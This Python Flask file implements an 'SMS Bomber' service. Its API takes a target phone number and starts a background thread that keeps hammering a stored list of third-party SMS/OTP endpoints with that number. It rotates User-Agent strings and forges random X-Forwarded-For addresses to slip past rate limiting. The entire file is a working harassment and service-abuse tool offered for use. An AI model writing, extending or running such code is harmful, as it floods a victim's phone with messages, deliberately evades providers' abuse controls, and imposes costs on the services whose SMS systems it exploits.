from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import json
import os
import time
import random
import threading
import requests as req_lib
from datetime import datetime

app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
CORS(app)

# ===== DATA FILES =====
REQUESTS_FILE = 'requests/requests.json'
STATS_FILE = 'config/stats.json'

# ===== LOAD DATA =====
def load_requests():
    try:
        with open(REQUESTS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_stats(data):
    os.makedirs(os.path.dirname(STATS_FILE), exist_ok=True)
    with open(STATS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_stats():
    try:
        with open(STATS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}

# ===== GLOBALS =====
requests_data = load_requests()
stats_data = load_stats()
bombing_active = False
bombing_thread = None
bombing_lock = threading.Lock()

# ===== ROUTES =====

@app.route('/')
@app.route('/api/health')
def health():
    return jsonify({"status": "ok", "message": "SMS Bomber API is live!"})

@app.route('/api/requests', methods=['GET'])
def get_requests():
    return jsonify(requests_data)

@app.route('/api/stats', methods=['GET'])
def get_stats():
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "total_requests": len(requests_data),
        "active_requests": active_count,
        "usage": stats_data
    })

@app.route('/api/bomb/start', methods=['POST'])
def start_bombing():
    global bombing_active, bombing_thread, stats_data
    
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({"error": "Phone number required"}), 400
    
    if bombing_active:
        return jsonify({"error": "Bombing already active"}), 400
    
    # Reset stats
    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
    save_stats(stats_data)
    
    bombing_active = True
    bombing_thread = threading.Thread(target=bombing_worker, args=(phone,))
    bombing_thread.daemon = True
    bombing_thread.start()
    
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "success": True,
        "message": f"Bombing started on {phone}",
        "phone": phone,
        "active_requests": active_count
    })

@app.route('/api/bomb/stop', methods=['POST'])
def stop_bombing():
    global bombing_active
    bombing_active = False
    return jsonify({
        "success": True,
        "message": "Bombing stopped",
        "stats": stats_data
    })

@app.route('/api/bomb/status', methods=['GET'])
def bombing_status():
    return jsonify({
        "active": bombing_active,
        "stats": stats_data,
        "active_requests": sum(1 for r in requests_data if r.get('active', True))
    })

# ===== BOMBING ENGINE =====
def bombing_worker(phone):
    global bombing_active, stats_data
    active_requests = [r for r in requests_data if r.get('active', True)]
    
    if not active_requests:
        bombing_active = False
        return
    
    while bombing_active:
        for req in active_requests:
            if not bombing_active:
                break
            
            phone_variants = req.get('phones', [phone])
            target_phone = random.choice(phone_variants) if phone_variants else phone
            
            url = req['url'].replace('{phone}', target_phone)
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            try:
                if req['method'] == 'POST':
                    if isinstance(req['body'], dict):
                        r = req_lib.post(url, headers=headers, json=req['body'], timeout=5)
                    else:
                        body = req['body'].replace('{phone}', target_phone)
                        r = req_lib.post(url, headers=headers, data=body, timeout=5)
                else:
                    r = req_lib.get(url, headers=headers, timeout=5)
                
                with bombing_lock:
                    stats_data['total_requests'] += 1
                    if r.status_code == 200:
                        stats_data['success'] += 1
                    elif r.status_code == 429:
                        stats_data['rate_limited'] += 1
                    else:
                        stats_data['failed'] += 1
                    save_stats(stats_data)
                
                print(f"[{req['name']}] {r.status_code} | {target_phone}")
                
            except Exception as e:
                with bombing_lock:
                    stats_data['total_requests'] += 1
                    stats_data['failed'] += 1
                    save_stats(stats_data)
                print(f"[{req['name']}] ERROR: {str(e)[:50]}")
            
            time.sleep(0.1)

@app.route('/admin')
@app.route('/admin/')
def serve_admin():
    return send_from_directory('../admin', 'index.html')

# Vercel handler
def handler(request, *args, **kwargs):
    return app(request, *args, **kwargs)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
